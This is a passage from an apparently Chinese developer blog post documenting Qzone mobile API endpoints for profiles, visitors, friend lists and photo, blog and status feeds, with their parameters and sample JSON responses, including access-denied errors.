<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>:<span class="number">-4009</span>,</span><br><span class="line">    <span class="attr">"subcode"</span>:<span class="number">-100004009</span>,</span><br><span class="line">    <span class="attr">"message"</span>:<span class="string">"空间主人设置了访问权限，您无法进行操作"</span>,</span><br><span class="line">    <span class="attr">"notice"</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">"time"</span>:<span class="number">1589266766</span>,</span><br><span class="line">    <span class="attr">"tips"</span>:<span class="string">"A673-153"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>:<span class="number">-4403</span>,</span><br><span class="line">    <span class="attr">"subcode"</span>:<span class="number">-100004403</span>,</span><br><span class="line">    <span class="attr">"message"</span>:<span class="string">"无操作权限"</span>,</span><br><span class="line">    <span class="attr">"notice"</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">"time"</span>:<span class="number">1589268589</span>,</span><br><span class="line">    <span class="attr">"tips"</span>:<span class="string">"6070-866"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>接口添加format参数可以返回指定数据格式:  默认是jsonp，同时支持 json,xml</code></p>
<h4 id="获取用户信息"><a href="#获取用户信息" class="headerlink" title="获取用户信息"></a>获取用户信息</h4><blockquote>
<p><a href="https://mobile.qzone.qq.com/profile_get?g_tk=见ptqrtoken生成算法&amp;format=json&amp;hostuin=123456" target="_blank" rel="noopener">https://mobile.qzone.qq.com/profile_get?g_tk=见ptqrtoken生成算法&amp;format=json&amp;hostuin=123456</a> (GET)</p>
</blockquote>
<p>hostuin 是要查询的用户QQ, 可以是自己的也可以是别人的。返回如下:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">// 成功返回</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">"subcode"</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">"message"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="attr">"default"</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">"data"</span>:&#123;</span><br><span class="line">        <span class="attr">"age"</span>:<span class="number">12</span>,</span><br><span class="line">        <span class="attr">"birthday"</span>:<span class="number">21</span>,</span><br><span class="line">        <span class="attr">"birthmonth"</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="attr">"birthyear"</span>:<span class="number">2007</span>,</span><br><span class="line">        <span class="attr">"city"</span>:<span class="string">"成都"</span>,</span><br><span class="line">        <span class="attr">"cityid"</span>:<span class="string">"1"</span>,</span><br><span class="line">        <span class="attr">"constellation"</span>:<span class="string">"水瓶座"</span>,</span><br><span class="line">        <span class="attr">"country"</span>:<span class="string">"中国"</span>,</span><br><span class="line">        <span class="attr">"countryid"</span>:<span class="string">"1"</span>,</span><br><span class="line">        <span class="attr">"face"</span>:<span class="string">"http://qlogo4.store.qq.com/qzone/QQ号码/QQ号码/100"</span>,</span><br><span class="line">        <span class="attr">"gender"</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="attr">"isBrandQzone"</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="attr">"islunar"</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="attr">"limitsMask"</span>:<span class="number">31</span>,</span><br><span class="line">        <span class="attr">"nickname"</span>:<span class="string">"0x5f3759df"</span>,</span><br><span class="line">        <span class="attr">"province"</span>:<span class="string">"四川"</span>,</span><br><span class="line">        <span class="attr">"provinceid"</span>:<span class="string">"51"</span>,</span><br><span class="line">        // 查询自己的信息时才会有下面的字段</span><br><span class="line">        "vip":0,</span><br><span class="line">        "viplevel":1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="获取用户全部信息"><a href="#获取用户全部信息" class="headerlink" title="获取用户全部信息"></a>获取用户全部信息</h4><blockquote>
<p><a href="https://h5.qzone.qq.com/proxy/domain/base.qzone.qq.com/cgi-bin/user/cgi_userinfo_get_all?uin=目标QQ&amp;vuin=当前用户QQ&amp;g_tk=见ptqrtoken生成算法&amp;format=json" target="_blank" rel="noopener">https://h5.qzone.qq.com/proxy/domain/base.qzone.qq.com/cgi-bin/user/cgi_userinfo_get_all?uin=目标QQ&amp;vuin=当前用户QQ&amp;g_tk=见ptqrtoken生成算法&amp;format=json</a></p>
</blockquote>
<p>uin目标QQ，但是需要对方允许你访问。返回如下:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"subcode"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"message"</span>: <span class="string">"获取成功"</span>,</span><br><span class="line">    <span class="attr">"default"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"data"</span>: &#123;</span><br><span class="line">        <span class="attr">"uin"</span>: QQ,</span><br><span class="line">        <span class="attr">"is_famous"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"famous_custom_homepage"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"nickname"</span>: <span class="string">"Mr.Gou"</span>,</span><br><span class="line">        <span class="attr">"emoji"</span>: [],</span><br><span class="line">        <span class="attr">"spacename"</span>: <span class="string">"Mr.Gou"</span>,</span><br><span class="line">        <span class="attr">"desc"</span>: <span class="string">"六年风雨生长只为两日花开. "</span>,</span><br><span class="line">        <span class="attr">"signature"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"avatar"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"sex_type"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"sex"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">"animalsign_type"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"constellation_type"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"constellation"</span>: <span class="number">7</span>,</span><br><span class="line">        <span class="attr">"age_type"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"age"</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="attr">"islunar"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"birthday_type"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"birthyear"</span>: <span class="number">2016</span>,</span><br><span class="line">        <span class="attr">"birthday"</span>: <span class="string">"11-01"</span>,</span><br><span class="line">        <span class="attr">"bloodtype"</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">"address_type"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"country"</span>: <span class="string">"中国"</span>,</span><br><span class="line">        <span class="attr">"province"</span>: <span class="string">"四川"</span>,</span><br><span class="line">        <span class="attr">"city"</span>: <span class="string">"成都"</span>,</span><br><span class="line">        <span class="attr">"home_type"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"hco"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"hp"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"hc"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"marriage"</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="attr">"career"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"company"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"cco"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"cp"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"cc"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"cb"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"mailname"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"mailcellphone"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"mailaddr"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"qzworkexp"</span>: [],</span><br><span class="line">        <span class="attr">"qzeduexp"</span>: [],</span><br><span class="line">        <span class="attr">"ptimestamp"</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="获取访客"><a href="#获取访客" class="headerlink" title="获取访客"></a>获取访客</h4><blockquote>
<p><a href="https://mobile.qzone.qq.com/mqz_get_visitor?g_tk=见ptqrtoken生成算法&amp;res_mode=0&amp;res_uin=QQ号码&amp;offset=0&amp;count=10&amp;page=1&amp;format=json&amp;t=1589267183290" target="_blank" rel="noopener">https://mobile.qzone.qq.com/mqz_get_visitor?g_tk=见ptqrtoken生成算法&amp;res_mode=0&amp;res_uin=QQ号码&amp;offset=0&amp;count=10&amp;page=1&amp;format=json&amp;t=1589267183290</a> (GET)</p>
</blockquote>
<p>res_uin参数为需要查看的QQ号码，page是页码,res_mode访问方式: 0表示谁访问我，1表示我访问过谁（这个需要权限，不允许查看别人访问了谁）, 2表示获取最近联系人</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"subcode"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"message"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"default"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"data"</span>: &#123;</span><br><span class="line">        <span class="attr">"count"</span>: <span class="number">20</span>,</span><br><span class="line">        <span class="attr">"lastgettime"</span>: <span class="number">1589267182</span>,</span><br><span class="line">        <span class="attr">"list"</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                "face_url": "http://qlogo4.store.qq.com/qzone/QQ号码/QQ号码/50",// 用户头像</span><br><span class="line">                "info": "查看日志《HTTP的请求头标签 If-Modified-Since》", // 查看内容</span><br><span class="line">                "nick": "-",// 昵称</span><br><span class="line">                "platform_src": 0,</span><br><span class="line">                "service_src": 2,</span><br><span class="line">                "source": 2,</span><br><span class="line">                "time": 1587610771,// 访问时间</span><br><span class="line">                "uin": QQ号码 // 访客QQ号码</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">        ],</span><br><span class="line">        "page": 1,</span><br><span class="line">        "todaycount": 0, // 今日浏览量</span><br><span class="line">        "totalcount": 602, // 历史浏览量</span><br><span class="line">        "totalpage": 2, // 总共可查看页码</span><br><span class="line">        "twlogincounts": 0</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="获取好友列表"><a href="#获取好友列表" class="headerlink" title="获取好友列表"></a>获取好友列表</h4><blockquote>
<p><a href="https://mobile.qzone.qq.com/friend/mfriend_list?g_tk=见ptqrtoken生成算法&amp;res_uin=QQ号码&amp;res_type=normal&amp;format=json&amp;count_per_page=10&amp;page_index=0&amp;page_type=0&amp;mayknowuin=&amp;qqmailstat=" target="_blank" rel="noopener">https://mobile.qzone.qq.com/friend/mfriend_list?g_tk=见ptqrtoken生成算法&amp;res_uin=QQ号码&amp;res_type=normal&amp;format=json&amp;count_per_page=10&amp;page_index=0&amp;page_type=0&amp;mayknowuin=&amp;qqmailstat=</a></p>
</blockquote>
<p>res_uin参数此处是无效， res_type有两种模式 normal和care,前者表示我全部的好友，后者表示我关心的好友</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">// 我的好友列表 ( res_type=normal )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"subcode"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"message"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"default"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"data"</span>: &#123;</span><br><span class="line">        <span class="attr">"gpnames"</span>: [ // 好友分组</span><br><span class="line">            &#123;</span><br><span class="line">                "gpid": 0, // 组ID</span><br><span class="line">                "gpname": "我的好友" // 组名</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        "list": [ // 我的好友(全部)</span><br><span class="line">            &#123;</span><br><span class="line">                "groupid": 0, // 好友分组ID</span><br><span class="line">                "isvip": 1, // 是否是vip</span><br><span class="line">                "nick": "babyQ", // 昵称</span><br><span class="line">                "remark": "babyQ",  // 备注</span><br><span class="line">                "searchField": "66600000 babyQ babyQ    ",// 搜索词</span><br><span class="line">                "uin": 66600000, // QQ号码</span><br><span class="line">                "viplevel": 9 // vip级别</span><br><span class="line">            &#125;</span><br><span class="line">            ... </span><br><span class="line">        ],</span><br><span class="line">        "mayknow": &#123; // 我可能认识的好友(每次请求可能都不同)</span><br><span class="line">            "allnum": 10,</span><br><span class="line">            "list": [</span><br><span class="line">                &#123;</span><br><span class="line">                    "nick": "xxxxx", // 备注昵称</span><br><span class="line">                    "profile_url": "http://qlogo2.store.qq.com/qzone/QQ号码/QQ号码/100",// 好友头像</span><br><span class="line">                    "reason": "",</span><br><span class="line">                    "uin": QQ号码 // 好友QQ号码</span><br><span class="line">                &#125; </span><br><span class="line">            ],</span><br><span class="line">            "page": 1</span><br><span class="line">        &#125;,</span><br><span class="line">        "speciallist": null</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 特别关注的好友 ( res_type=care )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">"subcode"</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">"message"</span>:<span class="string">""</span>,</span><br><span class="line">    <span class="attr">"default"</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">"data"</span>:&#123;</span><br><span class="line">        <span class="attr">"list"</span>:[// 特别关注的好友 </span><br><span class="line">            &#123;</span><br><span class="line">                "nick":"xxxx",// 昵称</span><br><span class="line">                "uin":好友QQ号码// QQ号码</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        "recommendlist":&#123; // 推荐我关注的好友</span><br><span class="line">            "list":[</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"nick"</span>:<span class="string">"xxxx"</span>,</span><br><span class="line">                    <span class="attr">"uin"</span>:<span class="string">"好友QQ号码"</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="获取照片、日志、说说、留言列表"><a href="#获取照片、日志、说说、留言列表" class="headerlink" title="获取照片、日志、说说、留言列表"></a>获取照片、日志、说说、留言列表</h4><p>这几个是同一个接口，参数不同而已</p>
<blockquote>
<p><a href="https://mobile.qzone.qq.com/list?g_tk=1190425035&amp;format=json&amp;list_type=album&amp;action=0&amp;res_uin=QQ号码&amp;count=10" target="_blank" rel="noopener">https://mobile.qzone.qq.com/list?g_tk=1190425035&amp;format=json&amp;list_type=album&amp;action=0&amp;res_uin=QQ号码&amp;count=10</a> (GET)</p>
</blockquote>
<p>count(页面大小), list_type：( blog=日志,shuoshuo=说说,msg=留言,album=相册) , res_attach= “att=offset%3D0%26tl=时间戳”</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"subcode"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"message"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"default"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"data"</span>: &#123;</span><br><span class="line">        "attach_info": "att=offset%3D1&amp;tl=1518835499",// 分页信息</span><br><span class="line">        "auto_load": 0,</span><br><span class="line">        "has_more": 1,// 是否还有数据</span><br><span class="line">        "remain_count": 1179,// 还有多少数据</span><br><span class="line">        "vFeeds": [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"cell_template"</span>: &#123;</span><br><span class="line">                    <span class="attr">"id"</span>: <span class="string">""</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"comm"</span>: &#123;</span><br><span class="line">                    <span class="attr">"actiontype"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"actionurl"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"appid"</span>: <span class="number">311</span>,</span><br><span class="line">                    <span class="attr">"curlikekey"</span>: <span class="string">"http://user.qzone.qq.com/QQ号码/mood/d3498a1f2b97875ae9370b00"</span>,</span><br><span class="line">                    <span class="attr">"feedskey"</span>: <span class="string">"d3498a1f2b97875ae9370b00"</span>,</span><br><span class="line">                    <span class="attr">"feedstype"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"operatemask"</span>: <span class="number">517131</span>,</span><br><span class="line">                    <span class="attr">"orglikekey"</span>: <span class="string">"http://user.qzone.qq.com/QQ号码/mood/d3498a1f2b97875ae9370b00"</span>,</span><br><span class="line">                    <span class="attr">"originaltype"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"refer"</span>: <span class="string">""</span>,</span><br><span class="line">                    <span class="attr">"subid"</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">"time"</span>: <span class="number">1518835499</span></span><br><span class="line">                &#125;,</span><br><span class="line">                "comment": &#123; // 评论</span><br><span class="line">                    "cntnum": 2,// 数据条数</span><br><span class="line">                    "comments": [</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">"audio"</span>: <span class="literal">null</span>,</span><br><span class="line">                            <span class="attr">"commentid"</span>: <span class="string">"1"</span>,</span><br><span class="line">                            <span class="attr">"commentpic"</span>: &#123;</span><br><span class="line">                                <span class="attr">"pic"</span>: <span class="literal">null</span></span><br><span class="line">                            &#125;,</span><br><span class="line">                            <span class="attr">"content"</span>: <span class="string">"知道啦[em]e104[/em][em]e104[/em][em]e104[/em]"</span>,</span><br><span class="line">                            <span class="attr">"date"</span>: <span class="number">1518836256</span>,</span><br><span class="line">                            <span class="attr">"picdata"</span>: &#123;</span><br><span class="line">                                <span class="attr">"pic"</span>: <span class="literal">null</span></span><br><span class="line">                            &#125;,</span><br><span class="line">                            <span class="attr">"refer"</span>: <span class="string">""</span>,</span><br><span class="line">                            <span class="attr">"replynum"</span>: <span class="number">0</span>,</span><br><span class="line">                            <span class="attr">"replys"</span>: <span class="literal">null</span>,</span><br><span class="line">                            <span class="attr">"user"</span>: &#123;</span><br><span class="line">                                <span class="attr">"from"</span>: <span class="number">1</span>,</span><br><span class="line">                                <span class="attr">"is_owner"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"level"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"logo"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"nickname"</span>: <span class="string">"xxxx"</span>,</span><br><span class="line">                                <span class="attr">"stuStarInfo"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"iStarLevel"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"iStarStatus"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"isAnnualVip"</span>: <span class="number">0</span></span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"uin"</span>: <span class="string">"好友QQ号码"</span>,</span><br><span class="line">                                <span class="attr">"vip"</span>: <span class="number">0</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        ...</span><br><span class="line">                    ],</span><br><span class="line">                    "main_comment": null,</span><br><span class="line">                    "num": 2 </span><br><span class="line">                &#125;,</span><br><span class="line">                "id": &#123;</span><br><span class="line">                    "cellid": "d3498a1f2b97875ae9370b00", // 该篇内容的ID</span><br><span class="line">                    "subid": ""</span><br><span class="line">                &#125;,</span><br><span class="line">                "like": &#123; // 点赞</span><br><span class="line">                    "isliked": 0,</span><br><span class="line">                    "likemans": [</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">"refer"</span>: <span class="string">""</span>,</span><br><span class="line">                            <span class="attr">"user"</span>: &#123;</span><br><span class="line">                                <span class="attr">"from"</span>: <span class="number">1</span>,</span><br><span class="line">                                <span class="attr">"is_owner"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"level"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"logo"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"nickname"</span>: <span class="string">"xxxx"</span>,</span><br><span class="line">                                <span class="attr">"stuStarInfo"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"iStarLevel"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"iStarStatus"</span>: <span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">"isAnnualVip"</span>: <span class="number">0</span></span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"uin"</span>: <span class="string">"好友QQ号码"</span>,</span><br><span class="line">                                <span class="attr">"vip"</span>: <span class="number">0</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        ...</span><br><span class="line">                    ],</span><br><span class="line">                    "num": 5</span><br><span class="line">                &#125;,</span><br><span class="line">                "operation": &#123; // 操作相关</span><br><span class="line">                    "busi_param": &#123;</span><br><span class="line">                        "16": "2",</span><br><span class="line">                        "18": "2",</span><br><span class="line">                        "184": "踏实一些，不要着急，你想要的，岁月都会给你。\nSteadfast some, don't try so hard, what you want, time will give you. ​​​​",</span><br><span class="line">                        "19": "QQ号码",</span><br><span class="line">                        "20": "d3498a1f2b97875ae9370b00",</span><br><span class="line">                        "23": "2",</span><br><span class="line">                        "30": "9",</span><br><span class="line">                        "5": "http://user.qzone.qq.com/QQ号码/mood/d3498a1f2b97875ae9370b00",</span><br><span class="line">                        "6": "http://user.qzone.qq.com/QQ号码/mood/d3498a1f2b97875ae9370b00"</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "share_info": &#123;</span><br><span class="line">                        "photo": &#123;</span><br><span class="line">                            "height": 580,</span><br><span class="line">                            "url": "http://m.qpic.cn/psb?/V144hICa2enRIy/vJd.JnA1nTt0TUb*7Al*hK5HcwJNqRuEqTxgLw3MTiM!/b/dGEBAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=RAJEAgAAAAAAACY!&amp;tl=1&amp;su=0158128849&amp;vuin=QQ号码&amp;tm=1589274000#sce=30-1-1&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-311-0",</span><br><span class="line">                            "width": 580</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "summary": "来自QQ空间说说",</span><br><span class="line">                        "title": "踏实一些，不要着急，你想要的，岁月都会给你。..."</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                "pic": &#123; // 图片</span><br><span class="line">                    "albumanswer": "",</span><br><span class="line">                    "albumid": "V144hICa2enRIy", // 相册ID</span><br><span class="line">                    "albumname": "", //  相册名称</span><br><span class="line">                    "albumnum": 9,</span><br><span class="line">                    "albumquestion": "", // 相册描述</span><br><span class="line">                    "albumrights": 0,</span><br><span class="line">                    "allow_access": 0,</span><br><span class="line">                    "anonymity": 0,</span><br><span class="line">                    "balbum": 0,</span><br><span class="line">                    "busi_param": null,</span><br><span class="line">                    "desc": "",</span><br><span class="line">                    "lastupdatetime": 0, // 最近一次更新时间</span><br><span class="line">                    "picdata": &#123;</span><br><span class="line">                        "pic": [</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="attr">"busi_param"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"-1"</span>: <span class="string">"http://b353.photo.store.qq.com/psb?/V144hICa2enRIy/vJd.JnA1nTt0TUb*7Al*hK5HcwJNqRuEqTxgLw3MTiM!/b/dGEBAAAAAAAA&amp;bo=RAJEAgAAAAAAACY!"</span>,</span><br><span class="line">                                    <span class="attr">"144"</span>: <span class="string">"http://user.qzone.qq.com/QQ号码/photo/V144hICa2enRIy/NDR000mKHy2Xh1rtn7s1YQEAAAAAAAA!_quan"</span>,</span><br><span class="line">                                    <span class="attr">"35"</span>: <span class="string">""</span>,</span><br><span class="line">                                    <span class="attr">"6"</span>: <span class="string">"http://user.qzone.qq.com/QQ号码/photo/V144hICa2enRIy/NDR000mKHy2Xh1rtn7s1YQEAAAAAAAA!"</span></span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"clientkey"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"commentcount"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"desc"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"isIndependentUgc"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"ismylike"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"lloc"</span>: <span class="string">"NDR000mKHy2Xh1rtn7s1YQEAAAAAAAA!"</span>,</span><br><span class="line">                                <span class="attr">"opsynflag"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"photourl"</span>: &#123;</span><br><span class="line">                                    <span class="attr">"0"</span>: &#123;</span><br><span class="line">                                        <span class="attr">"height"</span>: <span class="number">580</span>,</span><br><span class="line">                                        <span class="attr">"url"</span>: <span class="string">"http://m.qpic.cn/psb?/V144hICa2enRIy/vJd.JnA1nTt0TUb*7Al*hK5HcwJNqRuEqTxgLw3MTiM!/b/dGEBAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=RAJEAgAAAAAAACY!&amp;tl=1&amp;su=0158128849&amp;vuin=QQ号码&amp;tm=1589274000#sce=30-0-0&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-311-0"</span>,</span><br><span class="line">                                        <span class="attr">"width"</span>: <span class="number">580</span></span><br><span class="line">                                    &#125;,</span><br><span class="line">                                    <span class="attr">"1"</span>: &#123;</span><br><span class="line">                                        <span class="attr">"height"</span>: <span class="number">580</span>,</span><br><span class="line">                                        <span class="attr">"url"</span>: <span class="string">"http://m.qpic.cn/psb?/V144hICa2enRIy/vJd.JnA1nTt0TUb*7Al*hK5HcwJNqRuEqTxgLw3MTiM!/b/dGEBAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=RAJEAgAAAAAAACY!&amp;tl=1&amp;su=0158128849&amp;vuin=QQ号码&amp;tm=1589274000#sce=30-1-1&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-311-0"</span>,</span><br><span class="line">                                        <span class="attr">"width"</span>: <span class="number">580</span></span><br><span class="line">                                    &#125;,</span><br><span class="line">                                    <span class="attr">"11"</span>: &#123;</span><br><span class="line">                                        <span class="attr">"height"</span>: <span class="number">200</span>,</span><br><span class="line">                                        <span class="attr">"url"</span>: <span class="string">"http://m.qpic.cn/psb?/V144hICa2enRIy/vJd.JnA1nTt0TUb*7Al*hK5HcwJNqRuEqTxgLw3MTiM!/m/dGEBAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=RAJEAgAAAAAAACY!&amp;tl=1&amp;su=0158128849&amp;vuin=QQ号码&amp;tm=1589274000#sce=30-11-3&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-311-0"</span>,</span><br><span class="line">                                        <span class="attr">"width"</span>: <span class="number">200</span></span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;,</span><br><span class="line">                                <span class="attr">"picname"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"shoottime"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"sloc"</span>: <span class="string">""</span>,</span><br><span class="line">                                <span class="attr">"type"</span>: <span class="number">0</span>,</span><br><span class="line">                                <span class="attr">"uUploadTime"</span>: <span class="number">0</span></span><br><span class="line">                            &#125;</span><br><span class="line">                            ...</span><br><span class="line">                        ]</span><br><span class="line">                    &#125;,</span><br><span class="line">                    "picdata_index": 0,</span><br><span class="line">                    "uin": "0",</span><br><span class="line">                    "uploadnum": 9</span><br><span class="line">                &#125;,</span><br><span class="line">                "summary": &#123; // 日志，说说,留言有该字段，但是也有可能没有该字段</span><br><span class="line">                    "summary": "踏实一些，不要着急，你想要的，岁月都会给你。\nSteadfast some, don&amp;#39;t try so hard, what you want, time will give you. ​​​​"</span><br><span class="line">                &#125;,</span><br><span class="line">                "timeline": &#123; // 时间</span><br><span class="line">                    "timestr": "2018/02/17"</span><br><span class="line">                &#125;,</span><br><span class="line">                "userinfo": &#123; // 发布用户</span><br><span class="line">                    "user": &#123;</span><br><span class="line">                        "from": 1,</span><br><span class="line">                        "is_owner": 0,</span><br><span class="line">                        "level": 1,</span><br><span class="line">                        "logo": "",</span><br><span class="line">                        "nickname": "0x5f3759df",</span><br><span class="line">                        "stuStarInfo": &#123;</span><br><span class="line">                            "iStarLevel": 0,</span><br><span class="line">                            "iStarStatus": 0,</span><br><span class="line">                            "isAnnualVip": 0</span><br><span class="line">                        &#125;,</span><br><span class="line">                        "uin": "QQ号码",</span><br><span class="line">                        "vip": 0</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="获取相册详情"><a href="#获取相册详情" class="headerlink" title="获取相册详情"></a>获取相册详情</h4><blockquote>
